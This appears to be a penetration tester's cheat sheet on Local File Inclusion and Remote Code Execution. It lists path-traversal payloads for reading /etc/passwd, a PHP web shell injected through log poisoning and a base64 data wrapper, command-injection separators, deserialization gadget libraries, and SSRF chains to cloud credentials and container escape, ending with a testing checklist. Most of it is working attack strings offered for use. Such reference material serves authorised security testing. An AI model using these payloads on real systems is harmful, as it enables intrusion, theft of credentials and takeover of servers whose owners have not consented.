# LFI / RCE

## Local File Inclusion (LFI)

### Detection Payloads
```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation (PHP < 5.3.4)
....\/....\/etc/passwd                 # mix of separators
```

### LFI → RCE Escalation Paths

| Vector | Condition | Result |
|--------|-----------|--------|
| `/proc/self/environ` | PHP reads environ | Inject via User-Agent → RCE |
| `/var/log/apache2/access.log` | Log poisoning + LFI | Inject `<?php system($_GET['c']); ?>` via User-Agent |
| `/proc/self/fd/*` | Open file descriptors | Read uploaded temp files |
| `php://filter/convert.base64-encode/resource=index.php` | PHP wrapper | Read source code |
| `php://input` | allow_url_include=On | Direct RCE via POST body |
| `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+` | allow_url_include=On | RCE via data wrapper |
| `expect://id` | expect module loaded | Direct RCE |
| `input://` | PHP input stream | RCE via filter chain |

### PHP Filter Chains (RCE via LFI)
```bash
# Requires: allow_url_include=On or specific filter chain gadgets
# Example: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.iconv.UTF8.UTF7/resource=...
# See: https://github.com/synacktiv/php_filter_chain_generator
```

## Remote Code Execution (RCE)

### Command Injection (See security-arsenal)
```bash
; id
| id
` id `
$(id)
&& id
|| id
```

### Deserialization RCE
| Language | Library | Gadget Chain |
|----------|---------|--------------|
| Java | Apache Commons Collections | ysoserial |
| Java | Jackson | AutoType / @type |
| PHP | PHPGGC | __destruct / __wakeup |
| Python | pickle | __reduce__ |
| .NET | Json.NET / BinaryFormatter | TypeNameHandling |
| Node.js | node-serialize / funcster | IIFE / prototype |

### Template Injection RCE (See ssti.md)
Jinja2, Twig, Freemarker, ERB, Thymeleaf, EJS, Mako, Velocity, Pebble, Spring EL

### File Upload RCE (See file-upload.md)
SVG, polyglot, ImageMagick, GhostScript, ZIP slip, XXE in DOCX

### SSRF → RCE (See ssrf.md)
Cloud metadata → IAM creds → SSM / EC2 / Container escape
Internal Redis → cron/SSH key write
Docker API → container escape

## Testing Checklist
```
[ ] Test all LFI payloads on every file/path parameter
[ ] Test null byte (%00) if PHP < 5.3.4
[ ] Test double encoding
[ ] Test PHP filter chains for source read
[ ] Test log poisoning → LFI → RCE
[ ] Test /proc/self/environ injection
[ ] Test deserialization on all object inputs
[ ] Test command injection on all exec/system/popen sinks
[ ] Test template injection on all template inputs
[ ] Test file upload → RCE paths
```